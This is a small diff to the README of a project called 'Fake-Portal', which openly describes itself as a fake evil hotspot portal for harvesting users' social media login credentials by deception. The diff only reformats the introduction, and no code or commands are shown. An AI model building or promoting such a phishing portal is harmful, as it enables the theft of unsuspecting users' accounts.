@@ -1,10 +1,10 @@
 ##Fake-Portal 
 ######Fake portal to get user credentials from social media accounts.
 
-/* Introduction 
+**Introduction**
 
-Greetings, this is a fake/evil hotspot portal to capture credentials.
-It's a deceptive way to get user's social media login accounts. */
+Tthis is a *custom fake evil hotspot portal* to capture credentials.
+It's a deceptive way to get user's social media login accounts.
 
 
 /* Fake Portal - Harvest User Credentials */
